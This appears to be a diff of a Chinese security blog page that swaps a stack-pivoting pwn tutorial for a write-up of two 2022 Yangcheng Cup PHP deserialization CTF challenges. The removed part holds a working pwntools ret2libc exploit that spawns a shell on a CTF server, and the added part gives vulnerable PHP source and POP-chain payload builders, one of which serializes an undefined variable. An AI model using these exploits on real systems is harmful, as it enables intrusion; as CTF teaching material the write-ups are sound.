@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>花式栈溢出--栈迁移 | swedsn</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="花式栈溢出--栈迁移 | swedsn">
+  <title>2022羊城杯两道反序列化题 | swedsn</title>
+  <meta name="keywords" content=" Web安全 ">
+  <meta name="description" content="2022羊城杯两道反序列化题 | swedsn">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="忙里偷闲，记录生活关于博客我认为搭建博客主要分为三个阶段  第一个阶段：刚开始搭建博客，觉得搭建博客很神奇，就想搭建一个完整的博客，感觉有成就感   第二个阶段：这个时候已经了解了如何搭建博客。此时就想搭建一个好看，功能丰富的博客，于是尝试了不同的框架，更换了各种各样的主题，想搭建一个自己喜欢的一个博客，同时对于博客的认为是给别人看的   第三阶段：现在的我，只想要有一个简单的博客，简单到只要方便">
 <meta property="og:type" content="website">
@@ -705,9 +705,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-花式栈溢出-栈迁移" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-2022羊城杯两道反序列化题" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">花式栈溢出--栈迁移</h1>
+        <h1 class="article-title">2022羊城杯两道反序列化题</h1>
     
     <div class="article-meta">
         
@@ -717,22 +717,29 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Pwn入门">Pwn入门</a> > 
+            <a  data-rel="Web安全">Web安全</a> > 
             
-            <a  data-rel="Pwn入门&lt;---&gt;栈溢出">栈溢出</a>
+            <a  data-rel="Web安全&lt;---&gt;文件上传">文件上传</a>
             
         </span>
         
         
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">Web安全</a>
+            
+        </span>
+        
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2022-07-20 18:38:49'>2022-07-12 13:45</time>
+            发布时间 : <time class="date" title='最后更新: 2022-09-19 21:30:13'>2022-09-19 21:29</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:1.5k</span>
+        <span>字数:1.1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -751,7 +758,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA-%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-text">花式栈溢出 - 栈迁移</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-%EF%BC%9A%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-text">0x1 ：基本知识：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-%EF%BC%9A%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-%EF%BC%9A"><span class="toc-text">0x2 ：利用思路 ：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-%EF%BC%9A%E5%AE%9E%E4%BE%8B%E8%AE%B2%E8%A7%A3"><span class="toc-text">0x3 ：实例讲解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">总结：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step-by-step-v3"><span class="toc-text">step_by_step-v3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-1"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp1%EF%BC%9A%E5%88%A9%E7%94%A8-tostring"><span class="toc-text">exp1：利用__tostring</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp2%EF%BC%9A"><span class="toc-text">exp2：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#safepop"><span class="toc-text">safepop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -767,83 +774,167 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="花式栈溢出-栈迁移"><a href="#花式栈溢出-栈迁移" class="headerlink" title="花式栈溢出 - 栈迁移"></a>花式栈溢出 - 栈迁移</h1><h2 id="0x1-：基本知识："><a href="#0x1-：基本知识：" class="headerlink" title="0x1 ：基本知识："></a>0x1 ：基本知识：</h2><p>栈迁移技术来解决的问题：溢出的长度不够，只能覆盖到返回地址，以至于后面无法构造需要构造的rop链。</p>
-<p>前置知识：了解C语言是如何调用栈的</p>
-<p>栈迁移用到的最关键的两个汇编指令是：leave和ret指令。其作用就是用来还原栈空间的。</p>
-<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/a3da18c4a1d547cdb649ac61902b6889.png" alt="a3da18c4a1d547cdb649ac61902b6889"></p>
-<p>其作用的结果图大概就是下面这样（下面是调用函数时开辟的栈空间）：<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-16378953626282.png"></p>
-<h2 id="0x2-：利用思路-："><a href="#0x2-：利用思路-：" class="headerlink" title="0x2 ：利用思路 ："></a>0x2 ：利用思路 ：</h2><p>利用前提：<br>（1）存在两个变量的输入，如果只能输入一次的话，那必然无法造成溢出，其中一个输入buf变量刚好能溢出到返回地址，而另一个输入变量s的内容应该是存放到bss段或者其他。</p>
-<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-16378953680604.png"></p>
-<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/9ac4318f4c874843a88023d4c718d56f.png" alt="在这里插入图片描述"></p>
-<p>利用思路：一个栈空间长度不够，我既然能够输入两次，那我为什么不把这两个栈空间串联起来，就像把它变成一个栈一样（当然实质并不是这样的），这样的栈空间不就足够了吗？重点就是怎么样把两个栈串联起来呢？关键就是就是依靠leave和ret指令。</p>
-<p>首先我们知道调用函数时栈的过程会保存栈布局，并且会移动ebp、esp以此来形成新的栈帧。那和leave ret指令有什么关系呢？</p>
-<p>首先我们要知道栈迁移的payload的构成。下面是以32位的libc题型为例画的示意图</p>
-<pre><code class="c">payload1 = p32(write_plt_addr) + p32(main_addr) + p32(1) + p32(write_got_addr) + p32(4)
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>在此之前从未做出来过有关反序列化的题目，今天通过复现这两道题来浅学以下反序列化题目。之前始终无法理解如何使用，其根本原因发现是因为没有彻底理解魔术方法的使用，导致别人的pop链始终看不懂</p>
+</blockquote>
+<h2 id="step-by-step-v3"><a href="#step-by-step-v3" class="headerlink" title="step_by_step-v3"></a>step_by_step-v3</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><blockquote>
+<p>这道题在phpinfo里面存在flag的值，可能是一个非预期解。正常的情况应该是绕过include_once去读取到hint.php的数值。由于我是复现，并没有hint.php的内容，这里重点使用的是如果读取phpinfo，已经如何绕过include_once</p>
+</blockquote>
+<h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><pre><code class="php">&lt;?php
+error_reporting(0);
+class yang
+&#123;
+    public $y1;
+    public function __construct()
+    &#123;
+        $this-&gt;y1-&gt;magic();
+    &#125;
+    // 调用tostring执行phpinfo
+    public function __tostring()
+    &#123;
+        ($this-&gt;y1)();
+    &#125;
+    public function hint()
+    &#123;
+        include_once(&#39;hint.php&#39;);
+        if(isset($_GET[&#39;file&#39;]))
+        &#123;
+            $file = $_GET[&#39;file&#39;];
+            if(preg_match(&quot;/$hey_mean_then/is&quot;, $file))
+            &#123;
+                die(&quot;nonono&quot;);
+            &#125;
+            include_once($file);
+        &#125;
+    &#125;
+&#125;
 
-payload2 = offset*&#39;a&#39; + p32(bss_addr-4) + p32(leave_ret_addr)
+class cheng
+&#123;
+    public $c1;
+    public function __wakeup()
+    &#123;
+        $this-&gt;c1-&gt;flag = &#39;flag&#39;;
+    &#125;
+    public function __invoke()
+    &#123;
+        $this-&gt;c1-&gt;hint();
+    &#125;
+&#125;
+
+class bei
+&#123;
+    public $b1;
+    public $b2;
+    public function __set($k1,$k2)
+    &#123;
+        print $this-&gt;b1;
+    &#125;
+    public function __call($n1,$n2)
+    &#123;
+        echo $this-&gt;b1;
+    &#125;
+&#125;
+if (isset($_POST[&#39;ans&#39;])) &#123;
+    unserialize($_POST[&#39;ans&#39;]);
+&#125; else &#123;
+    highlight_file(__FILE__);
+&#125;
+
+?&gt;
 </code></pre>
-<p>最终的效果其实就是和泄露libc时的一样，只不过多了一个leave_ret地址，而且由一个payload变成了两个payload。加上函数调用完以后本身会执行leave和ret指令，这样就有两个了，反复利用leave和ret指令以此来达到栈迁移的目的。</p>
-<p>下面是payload在栈上面的布局情况：<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-16378953704046.png"></p>
-<p>我们重点来讲一讲函数调用完以后的返回过程，两个空间是怎么样串联起来的。</p>
-<p>（1）第一个leave指令：它先将栈空间清空，将esp弄了回来，然后将（构造好的空间的地址-4）传给了ebp。那为什么地址要减4，这是就和第二个leave指令有关了，之后会有解释。</p>
-<p>此时的栈内空间变化：<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAc3dlZHNu,size_20,color_FFFFFF,t_70,g_se,x_16.png"></p>
-<p>（2）第一个ret指令：它将带有leave和ret指令的地址传给了eip，那么接下来程序又会跳转到leave处。<br>此时的栈空间变化：<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAc3dlZHNu,size_20,color_FFFFFF,t_70,g_se,x_16-16378953744519.png"></p>
-<p>（3）第二个leave指：其实类似C语言调用栈过程（不过是相反的）。这里先mov esp ebp，然后再pop ebp。<br>bss-4的原因：这里由于需要再一次pop ebp，所以导致esp会变成esp的地址会加上4（32位），这也是为什么我们设置的bss段的地址要减去4，这样这样esp+4 &#x3D; bss_addr，而我们构造的payload的地址是从bss_addr开始的，只有这样我们才能准确的执行。如果你将地址写成bss段，就会导致esp &#x3D; bss_addr +4,然后执行预留返回地址，不会执行write_plt_addr。<br>这里需要提醒的是：这里是在bss段，并不是真的在栈当中，所以说之后的esp、ebp地址的变化其实并不需要管。只需要知道程序它会向下继续执行。</p>
-<p>此时的栈空间变化：<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-163789537708311.png"></p>
-<p>（4）第二个ret指令：将write_plt_addr传给eip，执行write函数。</p>
-<p>注意：bss段是从低地址向高地址往高地址增长，所以这是为什么esp在ebp的下面的原因。重点要知道的是他们之间的栈是怎么样的布局的，</p>
-<p>总共返回时的流程为：</p>
-<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-163789537887013.png"></p>
-<h2 id="0x3-：实例讲解"><a href="#0x3-：实例讲解" class="headerlink" title="0x3 ：实例讲解"></a>0x3 ：实例讲解</h2><p>题目链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BBlack%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98%5DPWN">[Black Watch 入群题]PWN</a></p>
-<p>程序分析：**<font color=red >32位程序，开启了NX保护</font>**。打开IDA，查看一下源代码<br><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxMDMyODA3,size_16,color_FFFFFF,t_70-163789538154015.png"><br>代码分析：上文分析过了，漏洞利用：栈迁移技巧，然后发现没有system函数而且开启了NX保护，所以利用libc的来泄露system函数。本题：栈迁移 + libc。</p>
-<p>exp ：</p>
-<pre><code class="python">from pwn import *
+<h3 id="exp1：利用-tostring"><a href="#exp1：利用-tostring" class="headerlink" title="exp1：利用__tostring"></a>exp1：利用__tostring</h3><p>（1）payload</p>
+<pre><code class="php">&lt;?php
+class yang
+&#123;
+    public $y1;
+&#125;
+class cheng
+&#123;
+    public $c1;
+&#125;
+class bei
+&#123;
+    public $b1;
+    public $b2;
+&#125;
+$yang=new yang();
+$cheng=new cheng();
+$bei=new bei();
 
-#r = process(&quot;./pwn&quot;)
-r = remote(&quot;node4.buuoj.cn&quot;,26026)
+$yang-&gt;y1=&quot;phpinfo&quot;;
+$bei-&gt;b1=$yang;
+$cheng-&gt;c1=$bei;
 
-e = ELF(&quot;./pwn&quot;)
-context(log_level = &#39;debug&#39;)
-libc = ELF(&quot;./libc-2.23.so&quot;)
-
-write_plt_addr = e.plt[&quot;write&quot;]
-write_got_addr = e.got[&quot;write&quot;]
-main_addr = e.symbols[&quot;main&quot;]
-bss_addr = 0x0804A300
-leave_ret_addr = 0x08048511 
-
-payload1 = p32(write_plt_addr) + p32(main_addr) + p32(1) + p32(write_got_addr) + p32(4)
-r.recvuntil(&quot;What is your name?&quot;)
-r.sendline(payload1)
-
-offset = 0x18
-payload2 = offset*&#39;a&#39; + p32(bss_addr-4) + p32(leave_ret_addr)
-
-r.recvuntil(&quot;What do you want to say?&quot;)
-r.send(payload2)
-
-write_addr = u32(r.recv(4))
-print(hex(write_addr))
-#pause()
-
-base_addr = write_addr - libc.symbols[&quot;write&quot;]
-system_addr = base_addr + libc.symbols[&quot;system&quot;]
-binsh_addr = base_addr + libc.search(&quot;/bin/sh&quot;).next()
-
-payload3 = p32(system_addr) + p32(1) + p32(binsh_addr)
-r.recvuntil(&quot;What is your name?&quot;)
-r.sendline(payload3)
-
-payload4 = offset*&#39;a&#39; + p32(bss_addr-4) + p32(leave_ret_addr)
-r.recvuntil(&quot;What do you want to say?&quot;)
-r.sendline(payload4)
-
-r.sendline(&quot;cat flag&quot;)
-r.interactive()
+echo serialize($cheng);
+?&gt;
 </code></pre>
-<p>这里有一个需要注意的点就是，第二个payload发送是用的send，而不是sendline，这里我卡了半天。我觉得这和read函数的读取机制有关系，因为read函数是会读取\n的，当你发送的内容没有溢出的话，它会输出下来，但是当你溢出时他只会输出最多的字节数。具体的原理我也是还没搞懂。</p>
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>栈迁移就是将这个空间不够的栈劫持（转移）到我能够写入的一个地方，只要这个地方的内容我提前布局好，就能想你想做的事情，我觉得就是两个栈空间结合起来，以此来扩大空间。</p>
-<p>其实如果不是很懂得话，只需要记住：两个payload加起来，然后与之前的想必中间多了一个bss_addr和leave_ret_addr，并且偏移量只是到ebp处。但是如果只是知道做题而不懂原理我是一点作用都没有的，不要为了做题而做题，做题是为了掌握知识点。</p>
+<p>（2）分析</p>
+<blockquote>
+<ul>
+<li>首先在yang类当中的存在__tostring魔术方法，只要$yang-&gt;y1 &#x3D; “phpinfo()”，然后echo $yang即可。接下来需要查看哪里存在输出函数</li>
+<li>存在输出函数的有两个地方，一个是bei类中的set魔术方法和call魔术方法。且输出的都是 $bei-&gt;b1 。只要赋值 $bei-&gt;b1&#x3D;$yang， 就能够print phpinfo(); 接下来要做的就是如何调用set或者是call魔术方法</li>
+<li>首先看set魔术方法调用的前提条件是要么b1或者b2为不可见属性，要么bei对象调用了bei类中未定义的属性，显然只能是第二种方式了。查看整个程序，可以发现在cheng类当中，存在this-&gt;c1-&gt;flag和hint，只要$cheng-&gt;c1&#x3D;$bei，那么只要存在bei-&gt;flag就会调用set魔术方法。而此时的wakeup恰好执行反序列化时就会调用，直接赋值即可</li>
+</ul>
+</blockquote>
+<p>（3）逆向思维得到payload</p>
+<pre><code class="php">$cheng = new cheng();
+$cheng-&gt;c1=new bei();
+$cheng-&gt;c1-&gt;b1 = new yang();
+$cheng-&gt;c1-&gt;b1-&gt;y1 = &quot;phpinfo&quot;;
+
+echo serialize($cheng);
+</code></pre>
+<p>首先令c1等于bei对象，从而使得调用</p>
+<p>（4）反思</p>
+<blockquote>
+<p>通过上面的解题思路，还有几种未尝试的方法，即使用call魔术方法和invoke函数方法，从而得到了以下的payload</p>
+</blockquote>
+<h3 id="exp2："><a href="#exp2：" class="headerlink" title="exp2："></a>exp2：</h3><p>（1）payload</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+class yang
+&#123;
+    public $y1;
+&#125;
+
+class cheng
+&#123;
+    public $c1;
+&#125;
+
+class bei
+&#123;
+    public $b1;
+    public $b2;
+&#125;
+
+// 调用wakeup函数，使得$bei-&gt;flag，从而调用set方法
+$cheng = new cheng();
+$cheng-&gt;c1 = new bei();
+
+// 打印出this-&gt;b1的值，这里的被设置成了类yang的对象，从而调用了tostring方法
+$cheng-&gt;c1-&gt;b1 = new yang();
+
+// 设置y1的值为类cheng的对象，此时的结果是$cheng()，此时就会调用invoke方法
+$cheng-&gt;c1-&gt;b1-&gt;y1 = new cheng();
+
+// 最后设c1的数值为yang类实例化后的对象，就会调用yang当中的hint方法
+$cheng-&gt;c1-&gt;b1-&gt;y1-&gt;c1 = new yang();
+echo serialize($a);
+
+?&gt;
+</code></pre>
+<h2 id="safepop"><a href="#safepop" class="headerlink" title="safepop"></a>safepop</h2><p>思路</p>
+<blockquote>
+<p>目的：只要调用Test类中的getflag即可即可，这个在Func类中的call_user_func函数就能做到 </p>
+<p>只要能调用Func类中的call魔术方法，即调用Func类中不存在的方法即可。进而需要调用get魔术方法，即a对象调用一个未定义的变量即可；这个在B类中的__destruct魔术方法中就存在，目的反推出了条件，符合</p>
+</blockquote>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
+<p>首先反序列化的题目可以分为正向分析和逆向分析，这两种思路其实是按照条件来的，看你先看到的是可以利用的条件还是你需要到达的条件。遇到难点的正向逆向可以同时分析</p>
+<p>然后就是发现了解了魔术方法的如何使用之后，就会发现所谓的POP链，就是不断的构造好条件使得能调用魔术方法，然后调用里面的内容</p>
+<p>重点是找目的和条件，根据条件如何实现某项功能罢了，现在目前所学到的就这些</p>
+</blockquote>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮箱至 1627319559@qq.com </span>
